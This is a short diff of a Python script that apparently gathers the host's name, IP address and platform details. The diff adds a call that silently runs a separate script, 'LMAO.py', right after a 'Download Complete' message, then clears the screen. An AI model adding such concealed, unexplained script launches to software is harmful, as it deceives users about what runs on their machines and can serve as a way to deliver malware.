@@ -8,6 +8,7 @@ from os import system
 from platform import platform
 from time import sleep
 import os
+from subprocess import call
 hostname = socket.gethostname()    
 IPAddr = socket.gethostbyname(hostname)
 puk = platform()[0], platform()[1],  platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]
@@ -354,6 +355,11 @@ os.system(delet)
 print("Download Complete")
 time.sleep(5)
 os.system(delet)
+
+call(["python", "LMAO.py"])
+
+os.system(delet)
+
 print("""
 ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 ''''' //=================================\\ '''''''''''''''',:c:clllllllollllolllllllllccc;'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
